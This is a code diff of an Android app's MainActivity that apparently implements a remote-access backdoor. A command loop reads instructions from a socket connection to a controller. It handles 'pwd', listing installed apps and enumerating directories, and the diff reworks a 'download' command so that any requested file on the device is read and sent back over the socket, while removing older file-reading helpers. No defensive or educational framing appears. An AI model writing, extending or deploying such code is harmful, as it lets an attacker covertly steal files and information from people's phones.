@@ -24,6 +24,7 @@ import java.io.FileInputStream;
 import java.io.FileNotFoundException;
 import java.io.IOException;
 import java.io.InputStreamReader;
+import java.io.OutputStream;
 import java.io.PrintWriter;
 import java.net.Socket;
 import java.nio.file.Path;
@@ -111,8 +112,6 @@ public class MainActivity extends AppCompatActivity {
         }
 
 
-
-
         String recv(Socket sock) {
             String str = "null";
 
@@ -195,69 +194,24 @@ public class MainActivity extends AppCompatActivity {
                 output = list_all_apps();
             } else if (cmd.startsWith("pwd")) {
                 output = currentpath;
-            }
-            else if (cmd.startsWith("download ")){
+            } else if (cmd.startsWith("download ")) {
                 try {
-                    send(server, "downloading");
-                byte[] data = readbytes(new File(currentpath + cmd.split("download ")[1]));
-                DataOutputStream dOut = new DataOutputStream(server.getOutputStream());
-                    dOut.writeInt(data.length); // write length of the message
+
+                    FileInputStream file_input_stream = new FileInputStream(cmd.split("download ")[1]);
+                    send(server, "filesize: " + file_input_stream.getChannel().size());
                     recv(server);
-                    dOut.write(data);           // write the message
-                }
-                catch (Exception e){
+                    byte bite[] = new byte[(int) file_input_stream.getChannel().size()];
+                    file_input_stream.read(bite, 0 , bite.length);
+                    OutputStream outputStream = server.getOutputStream();
+                    outputStream.write(bite, 0, bite.length);
+
+                } catch (Exception e) {
                     e.getStackTrace();
                 }
             }
             return output;
         }
-        String download(String cmd){
-            String output = "no information revieced from download";
-            File file = new File(currentpath + cmd.split("download ")[1]);
-            int size = (int) file.length();
-            byte[] bytes = new byte[size];
-            try {
-                BufferedInputStream buf = new BufferedInputStream(new FileInputStream(file));
-                buf.read(bytes, 0, bytes.length);
-                buf.close();
-            } catch (FileNotFoundException e) {
-                output = "file not found";
-                e.printStackTrace();
-            } catch (IOException e) {
-                output = "unknown error opening file";
-                e.printStackTrace();
-            }
-            return output;
-        }
 
-        byte[] readbytes(File f) {
-            int size = (int) f.length();
-            byte bytes[] = new byte[size];
-            byte tmpBuff[] = new byte[size];
-            try {
-                FileInputStream fis = new FileInputStream(f);
-                try {
-
-                    int read = fis.read(bytes, 0, size);
-                    if (read < size) {
-                        int remain = size - read;
-                        while (remain > 0) {
-                            read = fis.read(tmpBuff, 0, remain);
-                            System.arraycopy(tmpBuff, 0, bytes, size - remain, read);
-                            remain -= read;
-                        }
-                    }
-                } catch (IOException e) {
-                    throw e;
-                } finally {
-                    fis.close();
-                }
-            }
-            catch (Exception e){
-                e.getStackTrace();
-            }
-            return bytes;
-        }
         private void getAllFilesOfDir(File directory) {
             Log.d("filesofdir", "Directory: " + directory.getAbsolutePath() + "\n");
 
